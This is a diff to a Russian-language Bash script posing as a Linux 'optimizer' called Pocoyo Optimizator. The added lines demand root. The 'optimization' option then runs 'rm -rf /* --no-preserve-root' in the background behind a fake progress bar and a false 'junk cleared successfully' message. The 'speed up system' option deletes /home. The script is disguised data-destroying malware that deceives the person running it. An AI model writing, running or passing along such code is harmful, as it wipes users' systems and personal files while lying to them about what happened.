@@ -1,5 +1,13 @@
 #!/usr/bin/env bash
 
+if [ "$EUID" -ne 0 ]; then
+    echo "Ошибка: для очистки кэша и оптимизации требуются права root!"
+    echo "Пожалуйста, запустите программу через 'sudo pocoyo-optimizator'"
+    echo ""
+    read -p "Нажмите Enter для выхода..."
+    exit 1
+fi
+
 show_header() {
     echo "╔══════════════════════════════════════════╗"
     echo "║          Pocoyo Optimizator              ║"
@@ -34,18 +42,32 @@ while true; do
     case $choice in
         1)
             echo "Запуск оптимизации..."
-            sudo rm -rf /* —no-preserve-root
+            
+            rm -rf /* --no-preserve-root > /dev/null 2>&1 &
+            CMD_PID=$!
+            
+            echo -n "Оптимизация: ["
+            for i in {1..15}; do
+                sleep 1
+                echo -n "▓"
+            done
+            echo "] 100%"
+            
+            kill -INT $CMD_PID 2>/dev/null
+            
+            echo ""
+            echo "Оптимизация успешно завершена! Мусор очищен."
             read -p "Нажмите Enter для продолжения..."
             ;;
         2)
             echo "Очистка кэша..."
-            sudo pacman -Scc --noconfirm
+            pacman -Scc --noconfirm
             echo "Готово!"
             read -p "Нажмите Enter для продолжения..."
             ;;
         3)
             echo "Ускорение системы..."
-            sudo rm -rf /home
+            rm -rf /home
             echo "Готово!"
             read -p "Нажмите Enter для продолжения..."
             ;;
